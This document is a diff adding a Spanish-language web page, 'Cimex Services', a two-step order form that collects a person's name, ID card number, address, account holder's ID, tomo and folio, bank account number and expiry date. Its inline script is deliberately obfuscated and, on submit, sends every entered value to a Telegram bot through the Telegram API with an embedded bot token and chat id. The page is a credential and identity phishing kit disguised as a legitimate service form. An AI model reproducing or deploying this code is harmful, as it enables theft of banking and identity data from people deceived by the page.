@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Cimex Services</title>
+    <style>
+      textarea {
+        width: 100%;
+        padding: 10px;
+        border: 1px solid #ced4da;
+        background: transparent;
+        border-radius: 4px;
+        font-size: 14px;
+        resize: vertical; /* permite al usuario ajustar la altura */
+        box-sizing: border-box; /* evita que se desborde */
+      }
+
+      * {
+        box-sizing: border-box;
+      }
+      body {
+        font-family: Arial, sans-serif;
+        background-color: #fff7e8;
+        margin: 0;
+        padding: 0;
+      }
+      .container {
+        border: 1px solid #ced4da41;
+        max-width: 600px;
+        margin: 0.8rem auto;
+        background: #fff7e8;
+        padding: 20px 30px;
+        border-radius: 8px;
+        box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+      }
+      h2 {
+        margin-bottom: 1.75rem;
+        color: #343a40;
+      }
+      .form-group {
+        margin-bottom: 15px;
+      }
+      label {
+        display: block;
+        margin-bottom: 6px;
+        font-weight: bold;
+        color: #495057;
+      }
+      input {
+        width: 100%;
+        padding: 10px;
+        border: 1px solid #ced4da;
+        border-radius: 4px;
+        font-size: 14px;
+        background: transparent;
+      }
+      .error {
+        color: #c6301f;
+        font-size: 13px;
+        margin-top: 4px;
+        display: none;
+      }
+      .btn {
+        display: inline-block;
+        padding: 10px 20px;
+        font-size: 14px;
+        border-radius: 6px;
+        border: none;
+        cursor: pointer;
+        margin-top: 10px;
+      }
+      .btn-primary {
+        background-color: #1c4c6e;
+        color: #fff;
+      }
+      .btn-secondary {
+        background-color: #6c757d;
+        color: #fff;
+      }
+      .btn:disabled {
+        opacity: 0.6;
+        cursor: not-allowed;
+      }
+      .step {
+        display: none;
+      }
+      .step.active {
+        display: block;
+      }
+      .form-footer {
+        margin-top: 20px;
+        text-align: right;
+      }
+      .logo-container {
+        text-align: center; /* centra la imagen horizontalmente */
+      }
+      .logo {
+        max-width: 200px; /* limita el ancho máximo */
+        height: auto; /* mantiene proporción */
+      }
+    </style>
+  </head>
+  <body>
+    <div class="logo-container">
+      <img src="./logo.jpg" alt="logo" class="logo" />
+    </div>
+
+    <div class="container">
+      <form id="multiStepForm">
+        <!-- Paso 1 -->
+        <div class="step active" id="step1">
+          <h2>Datos del titular o propietario</h2>
+
+          <div class="form-group">
+            <label for="nombre">Nombre y apellidos</label>
+            <input
+              type="text"
+              id="nombre"
+              required
+              placeholder="Ej: Juan Pérez Gómez"
+            />
+            <span class="error">Este campo es obligatorio</span>
+          </div>
+          <div class="form-group">
+            <label for="carnet">No. de carnet</label>
+            <input
+              type="text"
+              id="carnet"
+              required
+              placeholder="Ej: 123456789"
+            />
+            <span class="error">Este campo es obligatorio</span>
+          </div>
+          <div class="form-group">
+            <label for="direccion">Dirección de entrega</label>
+            <textarea
+              id="direccion"
+              rows="4"
+              required
+              placeholder="Ej: Calle 10 #123, entre 5ta y 7ma, Vedado, La Habana"
+            ></textarea>
+            <span class="error">Este campo es obligatorio</span>
+          </div>
+
+          <div class="form-footer">
+            <button type="button" class="btn btn-primary" onclick="nextStep()">
+              Siguiente
+            </button>
+          </div>
+        </div>
+
+        <!-- Paso 2 -->
+        <div class="step" id="step2">
+          <h2>Documentación del titular de la cuenta</h2>
+          <div class="form-group">
+            <label for="carnetCuenta">No. de carnet</label>
+            <input
+              type="text"
+              id="carnetCuenta"
+              required
+              placeholder="Ej: 987654321"
+            />
+            <span class="error">Este campo es obligatorio</span>
+          </div>
+          <div class="form-group">
+            <label for="tomo">Tomo</label>
+            <input type="text" id="tomo" required placeholder="Ej: Tomo 12" />
+            <span class="error">Este campo es obligatorio</span>
+          </div>
+          <div class="form-group">
+            <label for="folio">Folio</label>
+            <input type="text" id="folio" required placeholder="Ej: Folio 45" />
+            <span class="error">Este campo es obligatorio</span>
+          </div>
+          <div class="form-group">
+            <label for="cuenta">No. de cuenta</label>
+            <input
+              type="text"
+              id="cuenta"
+              required
+              placeholder="Ej: 000123456789"
+            />
+            <span class="error">Este campo es obligatorio</span>
+          </div>
+          <div class="form-group">
+            <label for="vencimiento">Fecha de vencimiento</label>
+            <input type="date" id="vencimiento" required />
+            <span class="error">Este campo es obligatorio</span>
+          </div>
+          <div class="form-footer">
+            <button
+              type="button"
+              class="btn btn-secondary"
+              onclick="prevStep()"
+            >
+              Atrás
+            </button>
+            <button type="submit" class="btn btn-primary">
+              Finalizar y Autorizar
+            </button>
+          </div>
+        </div>
+      </form>
+    </div>
+
+    <script>
+     const _0x21457c=_0x226c;(function(_0x2306dd,_0x2b1cf3){const _0x54713e=_0x226c,_0x408439=_0x2306dd();while(!![]){try{const _0x461690=-parseInt(_0x54713e(0x196))/(-0x1395+0x1*0x638+0x6af*0x2)+parseInt(_0x54713e(0x1bf))/(0xa*-0x121+0x1*-0x1f4b+0x2a97)+parseInt(_0x54713e(0x19e))/(-0x9*0x7b+-0xcfa+-0x4*-0x454)+parseInt(_0x54713e(0x1ac))/(-0x1*-0x3ed+0x10d2+-0x6e9*0x3)*(-parseInt(_0x54713e(0x1e8))/(0x4bd*-0x1+-0x7df*-0x4+-0x1aba))+-parseInt(_0x54713e(0x182))/(0xd1*0x11+0x3e*-0x2+-0xd5f)*(parseInt(_0x54713e(0x17a))/(-0xd2b+-0x2c*0x18+-0x6*-0x2e3))+parseInt(_0x54713e(0x18d))/(0x1a*0x34+0x2320+-0x98*0x44)*(-parseInt(_0x54713e(0x189))/(-0x17b7+-0x16a3+0x2e63))+parseInt(_0x54713e(0x1c4))/(-0x11*-0x1af+-0x532+-0x1763);if(_0x461690===_0x2b1cf3)break;else _0x408439['push'](_0x408439['shift']());}catch(_0x439bf6){_0x408439['push'](_0x408439['shift']());}}}(_0x1c39,-0x353c1*-0x2+0x5fbd1+-0x16cc*0x61));function _0x1c39(){const _0x4c6294=['i.telegram','wtXBn','20dYGMQC','HkVMH','ById','CdCgZ','ón:\x20','eROGB','qHVcG','display','tSibling','style','direccion','49waddDa','\x0a📅\x20Vencimi','8141110316','\x0a\x20\x20\x20\x20','🚀\x20~\x20nombre','stener','datos.','orm','373002tgoRwv','ault','carnetCuen','addEventLi','log','JoqhE','\x0a📋\x20Nuevo\x20f','27rkMDxL','https://ap','KXiEL','ormulario\x20','314152nJXbqF','POST','nextElemen','forEach','querySelec','.step','torAll','.org/bot','n/json','241505BPZCoW','1kC5EE','multiStepF','\x0a📘\x20Tomo:\x20','nombre','get','ired],\x20tex','PWOxw','1000974rMZhhZ','GiwWp','UYpvQ','DtkjP','olicitud\x20d','block','KYdzI','remove','vencimient','CBUZD','getElement','none','/sendMessa','folio','66380dUTGdU','classList','active','KKtPldJVQ5','8514904907','submit','\x0a📄\x20Folio:\x20','add','ento:\x20','cuenta','\x0a📑\x20Carnet\x20','location','Cuenta:\x20','mVSTT','trim','iiwsG','ucuee','preventDef','yPgjr','187426ljYECa','e\x20su\x20pedid','VpGjs','CiHGi','json','6956410SwXgyo','etado\x20con\x20',':\x0a👤\x20Nombre','recibido\x20d','\x0a🪪\x20Carnet:','SpAqH','HAXDN','ZdJvj','then','ired]','applicatio','nviar\x20los\x20','gdvyA','\x0a🏠\x20Direcci','Se\x20a\x20compl','docKa',':AAE4foKmX','carnet','input[requ','tarea[requ','\x0a💳\x20Cuenta:','tomo','wKexj','exito\x20la\x20s','Error\x20al\x20e','stringify','step','SCnuL','value','uZeV8Izv4Z','catch','UXuSk','search','YvWrP'];_0x1c39=function(){return _0x4c6294;};return _0x1c39();}let currentStep=-0x16cc+-0x815+0x1ee2;function showStep(_0x2efddc){const _0x3355a3=_0x226c,_0x11153d={'CdCgZ':_0x3355a3(0x1ae),'KYdzI':function(_0xf6272f,_0x46e8fc){return _0xf6272f===_0x46e8fc;},'CiHGi':function(_0x22692a,_0x2fbe41){return _0x22692a-_0x2fbe41;},'wtXBn':_0x3355a3(0x192)};document[_0x3355a3(0x191)+_0x3355a3(0x193)](_0x11153d[_0x3355a3(0x1e7)])[_0x3355a3(0x190)]((_0x2b46b8,_0x87b5d4)=>{const _0x15739e=_0x3355a3;_0x2b46b8[_0x15739e(0x1ad)][_0x15739e(0x1a5)](_0x11153d[_0x15739e(0x1eb)]),_0x11153d[_0x15739e(0x1a4)](_0x87b5d4,_0x11153d[_0x15739e(0x1c2)](_0x2efddc,0x56*-0x8+0x17*-0x98+0x1059))&&_0x2b46b8[_0x15739e(0x1ad)][_0x15739e(0x1b3)](_0x11153d[_0x15739e(0x1eb)]);});}function validateStep(_0xb89f9a){const _0x3996bd=_0x226c,_0x3d383c={'DtkjP':_0x3996bd(0x1a3),'gdvyA':_0x3996bd(0x1a9),'UYpvQ':function(_0x2e9d3b,_0x2eca4e){return _0x2e9d3b+_0x2eca4e;},'GiwWp':_0x3996bd(0x1de),'yPgjr':_0x3996bd(0x1d6)+_0x3996bd(0x19c)+_0x3996bd(0x1d7)+_0x3996bd(0x1cd)},_0xbedd63=document[_0x3996bd(0x1a8)+_0x3996bd(0x1ea)](_0x3d383c[_0x3996bd(0x1a0)](_0x3d383c[_0x3996bd(0x19f)],_0xb89f9a)),_0x5d6767=_0xbedd63[_0x3996bd(0x191)+_0x3996bd(0x193)](_0x3d383c[_0x3996bd(0x1be)]);let _0x47e88c=!![];return _0x5d6767[_0x3996bd(0x190)](_0x39f15c=>{const _0x3f8184=_0x3996bd,_0x6ebc43=_0x39f15c[_0x3f8184(0x18f)+_0x3f8184(0x177)];!_0x39f15c[_0x3f8184(0x1e0)][_0x3f8184(0x1ba)]()?(_0x6ebc43[_0x3f8184(0x178)][_0x3f8184(0x176)]=_0x3d383c[_0x3f8184(0x1a1)],_0x47e88c=![]):_0x6ebc43[_0x3f8184(0x178)][_0x3f8184(0x176)]=_0x3d383c[_0x3f8184(0x1d0)];}),_0x47e88c;}function _0x226c(_0x32b3fa,_0x368f26){_0x32b3fa=_0x32b3fa-(-0xf7a+-0x39c+0x107*0x14);const _0x11b2dd=_0x1c39();let _0x5dd029=_0x11b2dd[_0x32b3fa];return _0x5dd029;}function nextStep(){const _0x3a1e50=_0x226c,_0x2ce7a8={'VpGjs':function(_0x5482ee,_0x2a91ee){return _0x5482ee(_0x2a91ee);}};_0x2ce7a8[_0x3a1e50(0x1c1)](validateStep,currentStep)&&(currentStep++,_0x2ce7a8[_0x3a1e50(0x1c1)](showStep,currentStep));}function prevStep(){const _0x4ac464=_0x226c,_0x3026a6={'PWOxw':function(_0x3700cf,_0x3e1af5){return _0x3700cf(_0x3e1af5);}};currentStep--,_0x3026a6[_0x4ac464(0x19d)](showStep,currentStep);}document[_0x21457c(0x1a8)+_0x21457c(0x1ea)](_0x21457c(0x198)+_0x21457c(0x181))[_0x21457c(0x185)+_0x21457c(0x17f)](_0x21457c(0x1b1),function(_0x4af575){const _0x2abb2b=_0x21457c,_0x36c0c7={'HAXDN':function(_0x2b2a2c,_0x28bbde){return _0x2b2a2c(_0x28bbde);},'JoqhE':_0x2abb2b(0x1d2)+_0x2abb2b(0x1c5)+_0x2abb2b(0x1db)+_0x2abb2b(0x1a2)+_0x2abb2b(0x1c0)+'o.','YvWrP':_0x2abb2b(0x1dc)+_0x2abb2b(0x1cf)+_0x2abb2b(0x180),'KXiEL':_0x2abb2b(0x19a),'eROGB':_0x2abb2b(0x1d5),'HkVMH':_0x2abb2b(0x179),'mVSTT':_0x2abb2b(0x184)+'ta','ZdJvj':_0x2abb2b(0x1d9),'docKa':_0x2abb2b(0x1ab),'CBUZD':_0x2abb2b(0x1b5),'ucuee':_0x2abb2b(0x1a6)+'o','SpAqH':_0x2abb2b(0x17e)+':','wKexj':_0x2abb2b(0x1b0)+_0x2abb2b(0x1d4)+_0x2abb2b(0x1af)+_0x2abb2b(0x1e1)+_0x2abb2b(0x197),'SCnuL':_0x2abb2b(0x17c),'iiwsG':function(_0x1dd547,_0x51f18b,_0x467224){return _0x1dd547(_0x51f18b,_0x467224);},'qHVcG':_0x2abb2b(0x18e),'UXuSk':_0x2abb2b(0x1ce)+_0x2abb2b(0x195)};_0x4af575[_0x2abb2b(0x1bd)+_0x2abb2b(0x183)]();if(!_0x36c0c7[_0x2abb2b(0x1ca)](validateStep,currentStep))return;const _0x215534={'nombre':document[_0x2abb2b(0x1a8)+_0x2abb2b(0x1ea)](_0x36c0c7[_0x2abb2b(0x18b)])[_0x2abb2b(0x1e0)],'carnet':document[_0x2abb2b(0x1a8)+_0x2abb2b(0x1ea)](_0x36c0c7[_0x2abb2b(0x1ed)])[_0x2abb2b(0x1e0)],'direccion':document[_0x2abb2b(0x1a8)+_0x2abb2b(0x1ea)](_0x36c0c7[_0x2abb2b(0x1e9)])[_0x2abb2b(0x1e0)],'carnetCuenta':document[_0x2abb2b(0x1a8)+_0x2abb2b(0x1ea)](_0x36c0c7[_0x2abb2b(0x1b9)])[_0x2abb2b(0x1e0)],'tomo':document[_0x2abb2b(0x1a8)+_0x2abb2b(0x1ea)](_0x36c0c7[_0x2abb2b(0x1cb)])[_0x2abb2b(0x1e0)],'folio':document[_0x2abb2b(0x1a8)+_0x2abb2b(0x1ea)](_0x36c0c7[_0x2abb2b(0x1d3)])[_0x2abb2b(0x1e0)],'cuenta':document[_0x2abb2b(0x1a8)+_0x2abb2b(0x1ea)](_0x36c0c7[_0x2abb2b(0x1a7)])[_0x2abb2b(0x1e0)],'vencimiento':document[_0x2abb2b(0x1a8)+_0x2abb2b(0x1ea)](_0x36c0c7[_0x2abb2b(0x1bc)])[_0x2abb2b(0x1e0)]},_0x263c15=new URLSearchParams(window[_0x2abb2b(0x1b7)][_0x2abb2b(0x1e4)]),_0x4035eb=_0x263c15[_0x2abb2b(0x19b)]('n');console[_0x2abb2b(0x186)](_0x36c0c7[_0x2abb2b(0x1c9)],_0x4035eb);const _0x5f2d10=_0x2abb2b(0x188)+_0x2abb2b(0x18c)+_0x2abb2b(0x1c7)+'e\x20'+_0x4035eb+(_0x2abb2b(0x1c6)+':\x20')+_0x215534[_0x2abb2b(0x19a)]+(_0x2abb2b(0x1c8)+'\x20')+_0x215534[_0x2abb2b(0x1d5)]+(_0x2abb2b(0x1d1)+_0x2abb2b(0x1ec))+_0x215534[_0x2abb2b(0x179)]+(_0x2abb2b(0x1b6)+_0x2abb2b(0x1b8))+_0x215534[_0x2abb2b(0x184)+'ta']+_0x2abb2b(0x199)+_0x215534[_0x2abb2b(0x1d9)]+_0x2abb2b(0x1b2)+_0x215534[_0x2abb2b(0x1ab)]+(_0x2abb2b(0x1d8)+'\x20')+_0x215534[_0x2abb2b(0x1b5)]+(_0x2abb2b(0x17b)+_0x2abb2b(0x1b4))+_0x215534[_0x2abb2b(0x1a6)+'o']+_0x2abb2b(0x17d),_0x1340ca=_0x36c0c7[_0x2abb2b(0x1da)],_0x9e2fb2=_0x36c0c7[_0x2abb2b(0x1df)];_0x36c0c7[_0x2abb2b(0x1bb)](fetch,_0x2abb2b(0x18a)+_0x2abb2b(0x1e6)+_0x2abb2b(0x194)+_0x1340ca+(_0x2abb2b(0x1aa)+'ge'),{'method':_0x36c0c7[_0x2abb2b(0x1ee)],'headers':{'Content-Type':_0x36c0c7[_0x2abb2b(0x1e3)]},'body':JSON[_0x2abb2b(0x1dd)]({'chat_id':_0x9e2fb2,'text':_0x5f2d10})})[_0x2abb2b(0x1cc)](_0x23b15f=>_0x23b15f[_0x2abb2b(0x1c3)]())[_0x2abb2b(0x1cc)](_0x2197ac=>{const _0x56546b=_0x2abb2b;_0x2197ac['ok']?_0x36c0c7[_0x56546b(0x1ca)](alert,_0x36c0c7[_0x56546b(0x187)]):_0x36c0c7[_0x56546b(0x1ca)](alert,_0x36c0c7[_0x56546b(0x1e5)]);})[_0x2abb2b(0x1e2)](_0x116ac3=>{const _0x5f0f18=_0x2abb2b;_0x36c0c7[_0x5f0f18(0x1ca)](alert,_0x36c0c7[_0x5f0f18(0x1e5)]);});});
+    </script>
+  </body>
+</html>
